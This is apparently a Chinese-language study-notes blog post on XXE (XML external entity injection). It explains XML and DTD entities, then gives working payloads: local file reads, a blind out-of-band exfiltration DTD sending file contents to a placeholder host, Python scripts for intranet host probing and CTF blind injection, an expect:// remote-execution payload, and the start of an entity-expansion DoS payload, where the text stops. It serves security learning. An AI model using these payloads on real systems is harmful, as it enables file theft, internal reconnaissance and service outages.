        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h1><p><em>把XXE归为TOP10基础漏洞,其实是因为我觉得是,并且难得分类了,以后所有的漏洞我都归类为TOP10基础漏洞</em></p><p>XXE的前身是XML注入,因为黑客想要得到的东西越来越多,所以出现了XXE</p><blockquote><p>实际上，XXE不是一个bug，而是XML解析器的well-documented特性。XML数据格式允许您在XML文档中包含任何外部文本文件的内容。</p></blockquote><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/xml%E6%B3%A8%E5%85%A5.png" alt></p><blockquote><p>本学习笔记,大量参考自网络上各位大佬总结好的,再加上自己的心得总结而成,用途仅用于安全技术学习.文末注明参考资料,侵删.</p></blockquote><a id="more"></a><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01  基础知识"></a>0x01  基础知识</h1><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XML 指可扩展标记语言,XML 被设计用来传输和存储数据。</p><h3 id="什么是-XML"><a href="#什么是-XML" class="headerlink" title="什么是 XML?"></a>什么是 XML?</h3><ul><li>XML 指可扩展标记语言（<em>EX</em>tensible <em>M</em>arkup <em>L</em>anguage）</li><li>XML 是一种<em>标记语言</em>，很类似 HTML</li><li>XML 的设计宗旨是<em>传输数据</em>，而非显示数据</li><li>XML 标签没有被预定义。您需要<em>自行定义标签</em>。</li><li>XML 被设计为具有<em>自我描述性</em>。</li><li>XML 是 <em>W3C 的推荐标准</em></li></ul><h3 id="XML-树结构"><a href="#XML-树结构" class="headerlink" title="XML 树结构"></a>XML 树结构</h3><p><strong>XML 文档形成了一种树结构，它从“根部”开始，然后扩展到“枝叶”。</strong></p><p>来看一个XML实例</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span> <span class="token comment" spellcheck="true">&lt;!--XML声明 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--描述文档的根元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--描述根的4个子元素to,from,heading,body --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--根元素的结尾--></span></code></pre><p>第一行是XML声明,定义了XML的版本和所使用的编码(可以不写这个)</p><blockquote><p>XML 文档必须包含<em>根元素</em>。该元素是所有其他元素的父元素。</p><p>XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端。</p><p>所有元素均可拥有子元素：</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>child</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>subchild</span><span class="token punctuation">></span></span>.....<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>subchild</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>child</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre></blockquote><p>父、子以及同胞等术语用于描述元素之间的关系。</p><p>一张图来解释</p><p><img src="https://www.w3school.com.cn/i/ct_nodetree1.gif" alt></p><h3 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h3><p>所有的XML元素必须有关闭的标签,XML标签对大小写敏感</p><p>XML的属性值必须加引号(单双引号均可以),属性=”名称/值”</p><p>实体引用 ,因为在XML中一些字符拥有特殊的意义</p><p>如果把这些字符放在XML元素中,会发生错误,这是因为解析器会把他当做新元素的开始</p><p>在 XML 中，有 5 个预定义的实体引用：</p><table><thead><tr><th>&lt;</th><th>&lt;</th><th>小于</th></tr></thead><tbody><tr><td>&gt;</td><td>&gt;</td><td>大于</td></tr><tr><td>&amp;</td><td>&amp;</td><td>和号</td></tr><tr><td>&apos;</td><td>‘</td><td>单引号</td></tr><tr><td>&quot;</td><td>“</td><td>引号</td></tr></tbody></table><p>注释：在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p><p>在XML中,<strong>空格会被保留</strong>,以LF存储换行</p><h3 id="XML解析器"><a href="#XML解析器" class="headerlink" title="XML解析器"></a>XML解析器</h3><p>所有线代浏览器都内建了读取和操作XML的XML解析器,解析器把XML转为为XML DOM对象  即可以通过javascript操作对象</p><p>loadXML()用于加载字符串,load()用于加载文件</p><h3 id="XML命名空间"><a href="#XML命名空间" class="headerlink" title="XML命名空间"></a>XML命名空间</h3><p>在两个不同的文档中使用相同的元素名时,就会发生命名冲突,可以使用前缀来避免命名冲突比如<code>&lt;h:table&gt;和&lt;f:table&gt;</code>就完美的区分了</p><p>使用命名空间,为标签添加属性xmlns,这样就为前缀赋予了一个与某个命名空间相关联的限定名称</p><h3 id="XML-CDATA"><a href="#XML-CDATA" class="headerlink" title="XML CDATA"></a>XML CDATA</h3><p>所有的XML文档中的文本均会被解析器解析,只有CDATA区段中的文本会被忽略</p><p>PCDATA:  指的是<strong>被解析</strong>的字符数据</p><p>CDATA 部分由 “*” 开始，由 “<em>]]&gt;</em>“ 结束：</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span><span class="token keyword">function</span> <span class="token function">matchwo</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;</span> b <span class="token operator">&amp;&amp;</span> a <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> then  <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token keyword">else</span>  <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>创建元素</p><p>createElement() 方法创建新的元素节点。</p><p>createTextNode() 方法创建新的文本节点。</p><p>appendChild() 方法向节点添加子节点（在最后一个子节点之后）。</p><p>删除元素</p><p>removeChild() 方法删除指定的节点（或元素）。</p><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>文档类型定义 (DTD) <a href="https://www.w3school.com.cn/dtd/index.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/dtd/index.asp</a></p><p>DTD 的作用是定义 XML 文档的结构。只有在 Internet Explorer 中，可以根据 DTD 来验证 XML。</p><h3 id="DTD-外部文档声明"><a href="#DTD-外部文档声明" class="headerlink" title="DTD 外部文档声明"></a>DTD 外部文档声明</h3><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><pre><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></pre><p>看一个例子</p><pre class=" language-XML"><code class="language-XML"><?xml version="1.0"?><!DOCTYPE note SYSTEM "note.dtd"> 这里读取note.dtd<note><to>George</to><from>John</from><heading>Reminder</heading><body>Don't forget the meeting!</body></note> </code></pre><h3 id="XML-文档构建模块"><a href="#XML-文档构建模块" class="headerlink" title="XML 文档构建模块"></a>XML 文档构建模块</h3><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><ul><li>元素</li><li>属性</li><li>实体</li><li>PCDATA </li><li>CDATA</li></ul><h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>PCDATA 的意思是被解析的字符数据（parsed character data）。</p><p>可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。</p><p><strong>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</strong></p><p>文本中的标签会被当作标记来处理，而实体会被展开。</p><p>不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</p><h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>CDATA 的意思是字符数据（character data）。</p><p><em>CDATA 是不会被解析器解析的文本。</em>在<strong>这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开</strong>。</p><h3 id="声明一个元素"><a href="#声明一个元素" class="headerlink" title="声明一个元素"></a>声明一个元素</h3><p>在 DTD 中，XML 元素通过元素声明来进行声明。元素声明使用下面的语法：</p><pre><code>&lt;!ELEMENT 元素名称 类别&gt;</code></pre><p>或者</p><pre><code>&lt;!ELEMENT 元素名称 (元素内容)&gt;</code></pre><h3 id="声明一个属性"><a href="#声明一个属性" class="headerlink" title="声明一个属性"></a>声明一个属性</h3><p>属性声明使用下列语法：</p><pre><code>&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</code></pre><h3 id="DTD-实体"><a href="#DTD-实体" class="headerlink" title="DTD  实体"></a>DTD  实体</h3><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><p>实体引用是对实体的引用。</p><p>实体可在内部或外部进行声明。</p><p>内部实体声明 </p><p>语法：</p><pre><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre><p>外部实体声明 (XXE漏洞来源)</p><p>语法:  </p><pre><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></pre><p>实体可以看成一个变量,我们可以在XML中使用&amp;符号进行引用</p><p><strong>示例代码：</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</code></pre><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p><p><strong>示例代码：</strong></p><pre><code>&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;&lt;creds&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便</p><p>实体也分通用实体和参数实体 , 用&amp;实体名引用的实体叫做通用实体,在DTD中定义,在XML文档中引用</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> <span class="token doctype">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM "file:///c:/windows/win.ini"></span> ]> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updateProfile</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>firstname</span><span class="token punctuation">></span></span>Joe<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>firstname</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastname</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastname</span><span class="token punctuation">></span></span>      ... <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updateProfile</span><span class="token punctuation">></span></span></code></pre><p>参数实体(参数实体在Blind XXE中非常重要): </p><p>1)使用% 实体名(中间有个空格),在DTD中定义,并且<strong>只能在DTD中使用%实体名;来进行引用</strong></p><p>2)只有在DTD文件中,参数实体的声明才能引用其他实体</p><p>3)和通用实体一样,参数实体也能够外部引用</p><pre><code>&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; %an-element; %remote-dtd;</code></pre><h1 id="0x02-什么是XXE"><a href="#0x02-什么是XXE" class="headerlink" title="0x02  什么是XXE"></a>0x02  什么是XXE</h1><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 <strong>外部实体</strong> ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(<strong>盯好外部实体就行了</strong>)，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190206172102-8598dd2c-29f0-1.png" alt></p><p><strong>XXE漏洞原理</strong></p><p>既然XML可以从外部读取DTD文件，那我们就自然地想到了如果将路径换成另一个文件的路径，那么<strong>服务器在解析这个XML的时候就会把那个文件的内容赋值给SYSTEM前面的根元素中，只要我们在XML中让前面的根元素的内容显示出来，不就可以读取那个文件的内容了</strong>。这就造成了一个任意文件读取的漏洞。</p><p>那如果我们指向的是一个内网主机的端口呢？是否会给出错误信息，我们是不是可以从错误信息上来判断内网主机这个端口是否开放，这就造成了一个内部端口被探测的问题。</p><p>另外，一般来说，服务器解析XML有两种方式，一种是一次性将整个XML加载进内存中，进行解析；另一种是一部分一部分的、“流式”地加载、解析。如果我们递归地调用XML定义，一次性调用巨量的定义，那么服务器的内存就会被消耗完，造成了拒绝服务攻击。</p><p>XXE在CTF中的例题可以看着个 <a href="http://d0g1.top/2020/01/03/Jarvis%20OJ%20CTF%20Writeup/" target="_blank" rel="noopener">API调用</a></p><h1 id="0x03-XXE分类"><a href="#0x03-XXE分类" class="headerlink" title="0x03 XXE分类"></a>0x03 XXE分类</h1><h2 id="有回显读本地敏感文件-Normal-XXE"><a href="#有回显读本地敏感文件-Normal-XXE" class="headerlink" title="有回显读本地敏感文件(Normal XXE)"></a>有回显读本地敏感文件(Normal XXE)</h2><p>方法:  通过引用外部实体,引用服务器上的文件</p><p>一般情况下的payload: </p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE test [&lt;!ENTITY a SYSTEM &quot;file//c/:/windows/system,ini&quot;&gt; ]&gt;&lt;test&gt;&amp;a;&lt;/test&gt; 通过$a;引用通用实体a 来读取system.ini,当然这里的文件可以随便改</code></pre><p>但是如果文件中含有特殊字符,这种一般的payload是得不到什么东西的,并且会报错,这个时候就需要基础知识中的<strong>CDATA和参数实体</strong>了</p><p>(by 参考资料1)</p><p><strong>payload:</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre><p><strong>evil.dtd</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code></pre><p>这里将存在问题的  SYSTEM”file://…..”写在CDATA中,使其不被解析,而在evil.dtd中又通过参数实体来引用了goodies实体 进而读取文件</p><h2 id="无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="无回显读取本地敏感文件(Blind OOB XXE)"></a>无回显读取本地敏感文件(Blind OOB XXE)</h2><p>正常情况下,服务器上的XML是不负责输出的,一般是用来配置服务的,那么想要利用这个漏洞就必须招待一个<strong>不依靠回显的方法</strong>,即:  外带</p><p>外带就必须要能发起请求,我们可以在外部实体定义的时候发起请求,但是只是发起请求还不够,还必须能把数据传出去</p><blockquote><p>而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)</p></blockquote><p><strong>test.dtd</strong></p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:9999?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>因为实体中的值不能有%</p><p><strong>payload：</strong></p><pre><code>&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt;</code></pre><p>连续调用三个参数实体,先调用% remote, 调用后请求远程服务器上的test.dtd,</p><p>然后调用% int 去调用test.dtd中的%file,%file就去获取服务器上的敏感文件,然后将得到的结果填入到%send中,最后再调用%send把读取到的数据发送到vps中,实现了外带,解决了XXE无回显的问题</p><p>可利用的不只是file协议,针对不同的平台有不同的协议可用</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" alt></p><h1 id="0x04-XXE利用"><a href="#0x04-XXE利用" class="headerlink" title="0x04 XXE利用"></a>0x04 XXE利用</h1><h2 id="HTTP-内网主机探测"><a href="#HTTP-内网主机探测" class="headerlink" title="HTTP 内网主机探测"></a><strong>HTTP 内网主机探测</strong></h2><p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p><p>探测脚本:  </p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token comment" spellcheck="true">#Origtional XML that the server accepts</span><span class="token comment" spellcheck="true">#&lt;xml></span><span class="token comment" spellcheck="true">#    &lt;stuff>user&lt;/stuff></span><span class="token comment" spellcheck="true">#&lt;/xml></span><span class="token keyword">def</span> <span class="token function">build_xml</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    xml <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;?xml version="1.0" encoding="ISO-8859-1"?>"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY >"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;!ENTITY xxe SYSTEM """</span> <span class="token operator">+</span> <span class="token string">'"'</span> <span class="token operator">+</span> string <span class="token operator">+</span> <span class="token string">'"'</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""">]>"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;xml>"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""    &lt;stuff>&amp;xxe;&lt;/stuff>"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;/xml>"""</span>    send_xml<span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">send_xml</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/xml'</span><span class="token punctuation">}</span>    x <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://34.200.157.128/CUSTOM/NEW_XEE.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>xml<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    coded_string <span class="token operator">=</span> x<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># a little split to get only the base64 encoded value</span>    <span class="token keyword">print</span> coded_string<span class="token comment" spellcheck="true">#   print base64.b64decode(coded_string)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        ip <span class="token operator">=</span> <span class="token string">'10.0.0.'</span> <span class="token operator">+</span> i        string <span class="token operator">=</span> <span class="token string">'php://filter/convert.base64-encode/resource=http://'</span> <span class="token operator">+</span> ip <span class="token operator">+</span> <span class="token string">'/'</span>        <span class="token keyword">print</span> string        build_xml<span class="token punctuation">(</span>string<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span><span class="token keyword">continue</span></code></pre><p><strong>我是SB</strong></p><h2 id="HTTP-内网主机端口扫描"><a href="#HTTP-内网主机端口扫描" class="headerlink" title="HTTP 内网主机端口扫描"></a><strong>HTTP 内网主机端口扫描</strong></h2><p>找到了内网的一台主机，<strong>想要知道攻击点在哪，我们还需要进行端口扫描</strong>，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然<strong>一般</strong>我们<strong>端口是通过响应的时间的长短判断该该端口是否开放的</strong>，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 的 intruder模块来 进行端口探测</p><h2 id="内网盲注-CTF"><a href="#内网盲注-CTF" class="headerlink" title="内网盲注(CTF)"></a><a href="https://xz.aliyun.com/t/3357#toc-13" target="_blank" rel="noopener"><strong>内网盲注(CTF)</strong></a></h2><p>放个脚本学习别人的写脚本思路和利用思路</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://39.107.33.75:33899/common.php'</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">''</span>data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"evil_man"</span><span class="token punctuation">,</span>        <span class="token string">"email"</span><span class="token punctuation">:</span><span class="token string">"testabcdefg@gmail.com"</span><span class="token punctuation">,</span>        <span class="token string">"comment"</span><span class="token punctuation">:</span><span class="token triple-quoted-string string">"""&lt;?xml version="1.0" encoding="utf-8"?>                &lt;!DOCTYPE root [                &lt;!ENTITY % dtd SYSTEM "http://evil_host/evil.dtd">                %dtd;]>                """</span><span class="token punctuation">}</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'./evil.dtd'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>            payload2 <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!ENTITY % file SYSTEM "php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary('{}'))then(0)else(1)end)-'1">                &lt;!ENTITY % all "&lt;!ENTITY % send SYSTEM 'http://evil_host/?result=%file;'>">                %all;                %send;"""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'_'</span><span class="token operator">*</span>i<span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">27</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span> <span class="token string">'test {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>                r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"Oti3a3LeLPdkPkqKF84xs="</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content <span class="token operator">and</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">'_'</span><span class="token punctuation">:</span>                        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>                        <span class="token keyword">print</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>                        <span class="token keyword">break</span><span class="token keyword">print</span> result</code></pre><hr><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>下面的内容和JAVA有关,由于我没学过JAVA,所以这里直接贴大佬总结好的东西</p><p>因为现实情况下,大部分XXE都是在java框架出现的,java有个 jar://  协议,</p><p>jar:// 协议的格式: </p><p>jar:{url}!{path}</p><p>实例: </p><pre><code>jar:http://host/application.jar!/file/within/the/zip这个 ! 后面就是其需要从中解压出的文件</code></pre><p><strong>jar 协议处理文件的过程：</strong></p><p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p><p><strong>那么我们怎么找到我们下载的临时文件呢？</strong></p><blockquote><p>因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用</p></blockquote><p>更多的看下面这个..</p><p><a href="https://xz.aliyun.com/t/3357#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-14</a></p><h2 id="PHP-expect-RCE"><a href="#PHP-expect-RCE" class="headerlink" title="PHP expect RCE"></a><strong>PHP expect RCE</strong></h2><p>由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</p><p><strong>示例代码：</strong></p><pre><code>&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect://id&quot;&gt;]&gt;&lt;dir&gt;&lt;file&gt;&amp;cmd;&lt;/file&gt;&lt;/dir&gt;</code></pre><h2 id="利用-XXE-进行-DOS-攻击"><a href="#利用-XXE-进行-DOS-攻击" class="headerlink" title="利用 XXE 进行 DOS 攻击"></a>利用 XXE 进行 DOS 攻击</h2><p><strong>示例代码：</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;     &lt;!DOCTYPE lolz [     &lt;!ENTITY lol &quot;lol&quot;&gt;     &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;     &lt;!ENTITY 